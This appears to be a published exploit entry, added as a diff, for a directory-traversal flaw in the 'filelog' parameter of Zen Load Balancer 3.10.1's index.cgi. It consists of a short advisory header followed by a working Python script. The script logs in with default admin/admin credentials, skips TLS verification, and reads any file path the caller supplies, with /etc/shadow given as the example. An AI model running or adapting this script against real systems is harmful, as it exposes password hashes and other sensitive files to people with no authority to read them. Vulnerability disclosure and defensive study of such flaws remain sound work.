@@ -1,0 +1,31 @@
+# Exploit Title: Zen Load Balancer 3.10.1 - 'index.cgi' Directory Traversal
+# Date: 2020-04-10
+# Exploit Author: Basim Alabdullah
+# Software Link: https://sourceforge.net/projects/zenloadbalancer/files/Distro/zenloadbalancer-distro_3.10.1.iso/download
+# Version: 3.10.1
+# Tested on: Debian8u2
+#
+# Technical Details:
+# The filelog parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.
+# The payload ../../../../../../../../../../../../../../../../etc/shadow was submitted in the filelog parameter. The requested file was returned in the application's response.
+# Note that disclosure of the shadow file may allow an attacker to discover users' passwords
+#
+# Impact:
+# --------
+# Successful exploitation could allow an attacker to obtain sensitive
+# information.
+
+import requests
+import sys
+
+if len(sys.argv) <2:
+    print("Example Use: python exploit.py https://192.168.1.1:444 /etc/shadow")
+    sys.exit(-1)
+else:
+    files=sys.argv[2]
+    url=sys.argv[1]    
+    with requests.session() as s:
+        urlz=url+"/index.cgi?id=2-3&filelog=../../../../../../../../../../../../../../../../"+files+"&nlines=100&action=See+logs"
+        response = s.get(urlz, auth=('admin', 'admin'), verify=False)
+        txt=response.text
+        print(response.text)
